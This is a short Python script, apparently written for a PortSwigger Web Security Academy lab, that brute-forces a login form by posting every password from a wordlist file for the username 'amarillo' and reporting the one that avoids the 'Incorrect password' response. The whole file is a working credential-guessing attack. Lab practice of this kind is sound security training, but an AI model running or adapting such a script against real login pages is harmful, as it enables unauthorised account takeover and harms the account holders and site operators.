import requests

url = "https://0a72006204d164fe8089c1fd00df002a.web-security-academy.net/login"

with open("passwords.txt") as f:
    for line in f:
        password = line.strip()
        response = requests.post(url, data={"username": "amarillo", "password": password})
        print(f"check: {password}") 
        if "Incorrect password" not in response.text:
            print(f"find: {password}")